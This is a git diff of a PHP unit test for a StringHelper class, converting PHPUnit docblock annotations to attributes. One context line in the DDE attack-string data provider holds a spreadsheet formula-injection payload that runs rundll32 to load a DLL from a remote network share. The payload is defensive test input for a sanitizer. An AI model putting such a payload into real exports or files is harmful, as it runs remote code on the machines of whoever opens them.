@@ -10,11 +10,11 @@
 namespace App\Tests\Utils;
 
 use App\Utils\StringHelper;
+use PHPUnit\Framework\Attributes\CoversClass;
+use PHPUnit\Framework\Attributes\DataProvider;
 use PHPUnit\Framework\TestCase;
 
-/**
- * @covers \App\Utils\StringHelper
- */
+#[CoversClass(StringHelper::class)]
 class StringHelperTest extends TestCase
 {
     public function testEnsureMaxLength(): void
@@ -48,9 +48,7 @@ class StringHelperTest extends TestCase
         yield [PHP_EOL . "=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
     }
 
-    /**
-     * @dataProvider getDdeAttackStrings
-     */
+    #[DataProvider('getDdeAttackStrings')]
     public function testSanitizeDde(string $input): void
     {
         self::assertEquals("' " . $input, StringHelper::sanitizeDDE($input));
@@ -62,9 +60,7 @@ class StringHelperTest extends TestCase
         yield [' '];
     }
 
-    /**
-     * @dataProvider getNonDdeAttackStrings
-     */
+    #[DataProvider('getNonDdeAttackStrings')]
     public function testSanitizeDdeWithCorrectStrings(string $input): void
     {
         self::assertEquals($input, StringHelper::sanitizeDDE($input));
